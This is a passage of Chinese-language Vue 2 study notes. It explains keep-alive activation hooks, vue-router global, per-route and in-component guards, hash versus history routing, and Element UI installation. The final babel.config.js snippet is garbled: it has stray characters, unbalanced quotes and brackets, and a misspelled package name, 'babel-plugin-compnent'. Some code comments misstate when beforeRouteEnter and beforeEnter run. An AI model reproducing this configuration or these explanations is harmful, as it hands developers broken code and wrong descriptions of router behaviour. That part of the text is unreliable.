            console.log('News组件被激活了')
            this.timer = setInterval(() => {
                this.opacity -= 0.01
                if(this.opacity <= 0) this.opacity = 1
            },16)
        },
        deactivated(){
            console.log('News组件失活了')
            clearInterval(this.timer)
        }
    }
</script>
```

**总结：**

1. `activated`和`deactivated`是路由组件所独有的两个钩子，用于捕获路由组件的激活状态
2. 具体使用：
   1. `activated`路由组件被激活时触发
   2. `deactivated`路由组件失活时触发

### 13.路由守卫

#### 13.1 全局路由守卫

router/index.js

```vue
//该文件专门用于创建整个应用的路由器
import VueRouter from "vue-router";
//引入组件
import Home from '../pages/Home'
import About from '../pages/About'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'

//创建一个路由器
const router = new VueRouter({
    routes:[
        {
            name:'guanyv',
            path:'/about',
            component:About,
            meta:{title:'关于'}
        },
        {
            name:'zhuye',
            path:'/home',
            component:Home,
            meta:{title:'主页'},
            children:[
                {
                    name:'xinwen',
                    path:'news',
                    component:News,
                    meta:{isAuth:true,title:'新闻'}
                },
                {
                    name:'xiaoxi',
                    path:'message',
                    component:Message,
                    meta:{isAuth:true,title:'消息'},
                    children:[
                        {
                            name:'xiangqing',
                            path:'detail',
                            component:Detail,
                            meta:{isAuth:true,title:'详情'},
							props($route){
								return {
									id:$route.query.id,
									title:$route.query.title,
								}
							}
                        }
                    ]
                }
            ]
        }
    ]
})

//全局前置路由守卫————初始化的时候、每次路由切换之前被调用
router.beforeEach((to,from,next) => {
    console.log('前置路由守卫',to,from)
    if(to.meta.isAuth){
        if(localStorage.getItem('school')==='atguigu'){
            next()
        }else{
            alert('学校名不对，无权限查看！')
        }
    }else{
        next()
    }
})

//全局后置路由守卫————初始化的时候被调用、每次路由切换之后被调用
router.afterEach((to,from)=>{
	console.log('后置路由守卫',to,from)
	document.title = to.meta.title || '硅谷系统'
})

//导出路由器
export default router
```

#### 13.2 独享路由

将beforeEach改为beforeEnter

router/index:

```js
//该文件专门用于创建整个应用的路由器
import VueRouter from "vue-router";
//引入组件
import Home from '../pages/Home'
import About from '../pages/About'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'


//创建一个路由器
const router = new VueRouter({
    routes:[
        {
            name:'guanyv',
            path:'/about',
            component:About,
            meta:{title:'关于'}
        },
        {
            name:'zhuye',
            path:'/home',
            component:Home,
            meta:{title:'主页'},
            children:[
                {
                    name:'xinwen',
                    path:'news',
                    component:News,
                    meta:{title:'新闻'},
                    //独享守卫，特定路由切换之后被调用
                    beforeEnter(to,from,next){
                        console.log('独享路由守卫',to,from)
                        if(localStorage.getItem('school') === 'atguigu'){
                            next()
                        }else{
                            alert('暂无权限查看')
                        }
                    }
                },
                {
                    name:'xiaoxi',
                    path:'message',
                    component:Message,
                    meta:{title:'消息'},
                    children:[
                        {
                            name:'xiangqing',
                            path:'detail',
                            component:Detail,
                            meta:{title:'详情'},
							props($route){
								return {
									id:$route.query.id,
									title:$route.query.title,
								}
							}
                        }
                    ]
                }
            ]
        }
    ]
})

//全局后置路由守卫————初始化的时候被调用、每次路由切换之后被调用
router.afterEach((to,from)=>{
	console.log('后置路由守卫',to,from)
	document.title = to.meta.title || '硅谷系统'
})

//导出路由器
export default router
```

#### 13.3 组件内路由：

将beforeEach和beforeEnter改为beforeRouteEnter

beforeRouteLeave和afterEach,有不同：

1.beforeRouteLeave在到达下一个路由前起作用

2.afterEach在到达下一个路由后起作用

```vue
<template>
    <h2>我是About组件的内容</h2>
</template>

<script>
    export default {
        name:'About',
        //通过路由规则，离开该组件时被调用
        beforeRouteEnter (to, from, next) {
            console.log('About--beforeRouteEnter',to,from)
            if(localStorage.getItem('school')==='atguigu'){
                next()
            }else{
                alert('学校名不对，无权限查看！')
            }
        },
        //通过路由规则，离开该组件时被调用
        beforeRouteLeave (to, from, next) {
            console.log('About--beforeRouteLeave',to,from)
            next()
        }
    }
</script>
```

**总结：**

1. 作用：对路由进行权限控制

2. 分类：全局守卫、独享守卫、组件内守卫

3. 全局守卫：

   ```js
   //全局前置守卫：初始化时执行、每次路由切换前执行
   router.beforeEach((to,from,next)=>{
   	console.log('beforeEach',to,from)
   	if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
   		if(localStorage.getItem('school') === 'atguigu'){ //权限控制的具体规则
   			next() //放行
   		}else{
   			alert('暂无权限查看')
   		}
   	}else{
   		next() //放行
   	}
   })
   
   //全局后置守卫：初始化时执行、每次路由切换后执行
   router.afterEach((to,from) => {
   	console.log('afterEach',to,from)
   	if(to.meta.title){ 
   		document.title = to.meta.title //修改网页的title
   	}else{
   		document.title = 'vue_test'
   	}
   })
   
   ```

   独享守卫：

   ```js
   beforeEnter(to,from,next){
   	console.log('beforeEnter',to,from)
       if(localStorage.getItem('school') === 'atguigu'){
           next()
       }else{
           alert('暂无权限查看')
       }
   }
   
   ```

   组件内守卫：

   ```vue
   //进入守卫：通过路由规则，进入该组件时被调用
   beforeRouteEnter (to, from, next) {...},
   //离开守卫：通过路由规则，离开该组件时被调用
   beforeRouteLeave (to, from, next) {...},
   ```

   

### 16.路由器工作的两种状态：history和hash(/#/)

对于一个url来说，什么是hash值？—— #及其后面的内容就是hash值

hash值不会包含在 HTTP 请求中，即：hash值不会带给服务器

hash模式：

地址中永远带着#号，不美观
若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法
兼容性较好
history模式：

地址干净，美观
兼容性和hash模式相比略差
应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题

## Vue UI 组件库

#### 7.1 常用UI组件库

##### 7.1.1 移动端常用UI组件库

1. [Vant](https://youzan.github.io/vant)
2. [Cube UI](https://didi.github.io/cube-ui)
3. [Mint UI](http://mint-ui.github.io/)

##### 7.1.2. PC端常用UI组件库

1. [Element UI](https://element.eleme.cn/)
2. [IView UI](https://www.iviewui.com/)

#### 7.2. element-ui基本使用

1. 安装 element-ui：`npm i element-ui -S`

2. main.js:

   ```js
   import Vue from 'vue'
   import App from './App.vue'
   //引入ElementUI组件库
   import ElementUI from 'element-ui';
   //引入ElementUI全部样式
   import 'element-ui/lib/theme-chalk/index.css';
   
   Vue.config.productionTip = false
   //使用ElementUI
   Vue.use(ElementUI)
   
   new Vue({
       el:"#app",
       render: h => h(App),
   })
   ```

   ### 

### 7.3 局部引用

安装：npm install babel-plugin-compnent -D

修改 babel.config.js:

```js
module.exports = {
presets: [
"@vue/cli-plugin-babel/preset',
["@babel/preset-env", { "modules": false H],],
plugins:[[
"component",{
"libraryName": "element-ui",
"styleLibraryName": "theme-chalk"}
i1}
```



